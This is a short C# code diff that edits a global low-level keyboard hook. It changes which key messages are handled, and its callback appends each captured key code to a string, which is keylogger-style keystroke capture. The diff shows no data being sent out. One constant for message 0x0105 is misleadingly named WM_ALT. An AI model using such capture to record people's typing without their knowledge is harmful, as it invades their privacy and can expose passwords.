@@ -43,8 +43,9 @@ namespace hook
             private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
 
             private const int WH_KEYBOARD_LL = 13;
-            private const int WM_KEYDOWN = 0x0100;
-            private const int WH_ALT = 0x0105;
+            private const int WM_KEYDOWN = 0x0100; //на любую клавищу
+            private const int WM_SYSKEYDOWN = 0x0104; //при зажатой alt (вывод с alt)
+            private const int WM_ALT = 0x0105; //при нажатой (вывод без alt)
 
             public static void StartHook()
             {
@@ -64,7 +65,7 @@ namespace hook
 
             private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
             {
-                if (nCode >= 0 && wParam == (IntPtr)WH_ALT)
+                if (nCode >= 0 && wParam == (IntPtr)WM_SYSKEYDOWN)
                 {
                     int vkCode = Marshal.ReadInt32(lParam);
                     s += (Keys)vkCode;
